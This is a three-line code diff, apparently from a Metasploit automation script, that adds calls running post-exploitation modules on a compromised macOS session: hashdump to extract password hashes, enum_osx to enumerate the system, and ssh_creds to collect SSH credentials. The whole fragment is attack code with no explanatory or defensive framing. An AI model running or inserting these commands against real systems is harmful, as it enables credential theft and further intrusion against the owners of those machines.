@@ -1,0 +1,3 @@
+				session.run_cmd('run post/osx/gather/hashdump')
+				session.run_cmd('run post/osx/gather/enum_osx')
+				session.run_cmd('run post/multi/gather/ssh_creds')
